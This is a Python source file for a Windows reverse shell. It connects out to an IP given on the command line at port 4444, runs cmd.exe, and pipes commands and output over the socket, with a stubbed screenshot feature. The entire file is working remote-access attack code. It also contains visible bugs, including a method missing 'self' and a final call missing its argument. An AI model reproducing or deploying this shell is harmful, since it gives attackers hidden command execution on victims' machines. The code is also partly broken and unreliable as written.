from mss import mss 
import socket
import subprocess
import threading
import sys

class Shell:
    ### Main Shell Class, will include basic CMD line functions
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

        shell=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        shell.connect((self.ip,self.port))

        self.start(shell)
    
    # method for handling incoming commands
    def s2p(self, socket, process):
        while True:
            data = socket.recv(1024)
            if len(data) > 0 and str(data) != "shelly_pic":
                process.stdin.write(data)
                process.stdin.flush()
            elif str(data) == "shelly_pic":
                self.screenshot()

    # sending stdout back to server
    def p2s(self, socket, process):
        while True:
            socket.send(process.stdout.read(1))

    # take screenshots, and send them
    def screenshot():
        pass
    
    def start(self, socket): 
        process=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=self.s2p, args=[socket, process])
        s2p_thread.daemon = True
        s2p_thread.start()
        
        
        p2s_thread = threading.Thread(target=self.p2s, args=[socket, process])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            process.wait()
        except KeyboardInterrupt:
            socket.close()



if __name__ == '__main__':
    IP = sys.argv[1]
    PORT = 4444

    shell = Shell(IP,PORT)
    shell.start()